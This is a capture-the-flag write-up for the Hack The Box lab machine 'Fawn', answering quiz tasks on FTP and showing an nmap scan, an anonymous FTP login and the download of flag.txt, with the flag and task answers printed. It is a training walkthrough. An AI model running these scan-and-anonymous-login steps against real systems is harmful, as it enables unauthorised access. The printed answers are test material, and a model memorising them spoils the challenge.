>  Fawn is a very easy Linux machine which explores the File Transfer Protocol (FTP) and its exploitation when misconfigured to allow anonymous access.

---
## Task 1
>What does the 3-letter acronym FTP stand for?

### Answer : `File Transfer Protocol`

---
## Task 2
>Which port does the FTP service listen on usually?

### Answer : `21`

---
## Task 3
>FTP sends data in the clear, without any encryption. What acronym is used for a later protocol designed to provide similar functionality to FTP but securely, as an extension of the SSH protocol?

> [!INFO] 
> - **SFTP:** Berjalan di atas protokol SSH (port 22). Ini adalah cara paling umum dan aman untuk mentransfer file di sistem Linux modern.
>- **FTPS:** Ini berbeda dengan SFTP. FTPS adalah protokol FTP biasa yang ditambahkan lapisan enkripsi SSL/TLS (biasanya berjalan di port 990 atau 21).

### Answer : `SFTP`

---
## Task 4
>What is the command we can use to send an ICMP echo request to test our connection to the target?

### Answer : `ping`

---
## Task 5
>From your scans, what version is FTP running on the target?

Let's perform a `nmap` scan on port 21 :
```shell
┌──(nus㉿kali-htb)-[~/HTB]
└─$ sudo nmap $IP -sV -sC -p21
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-22 14:16 +0700
Nmap scan report for 10.129.171.244
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.178
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.30 seconds
```

### Answer : `vsftpd 3.0.3`

---
## Task 6
>From your scans, what OS type is running on the target?

From the `nmap` result before, we knew the OS was `Unix`
### Answer : `Unix`

---
## Task 7
>What is the command we need to run in order to display the 'ftp' client help menu?
### Answer : `ftp -?`

---
## Task 8
>What is username that is used over FTP when you want to log in without having an account?
### Answer : `anonymous`

---
## Task 9
>What is the response code we get for the FTP message 'Login successful'?

```shell
┌──(nus㉿kali-htb)-[~/HTB]
└─$ ftp $IP
Connected to 10.129.171.244.
220 (vsFTPd 3.0.3)
Name (10.129.171.244:nus): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```
### Answer : `230`

---
## Task 10
>There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system.
### Answer : `ls`

---
## Task 11 
>What is the command used to download the file we found on the FTP server?
### Answer : `get`

---
## Flag Retrieving

After connecting to FTP server, we find `flag.txt` on the home server, and use `get` to download the file.
```shell
ftp> ls
229 Entering Extended Passive Mode (|||46175|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||42445|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |********************************************************************************************************************************************************************|    32        7.50 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (0.17 KiB/s)
```

Check for the Directory where we connect to the `FTP Server` :
```shell
┌──(nus㉿kali-htb)-[~/HTB]
└─$ cat flag.txt
035db21c881520061c53e0536e44f815%
```

Or user local command to obtain from `FTP server`:
```shell
ftp> !cat flag.txt
035db21c881520061c53e0536e44f815
```

> [!info] Local Command
> We could use `!<command>` to run a command from local 

---
## Flag : `035db21c881520061c53e0536e44f815`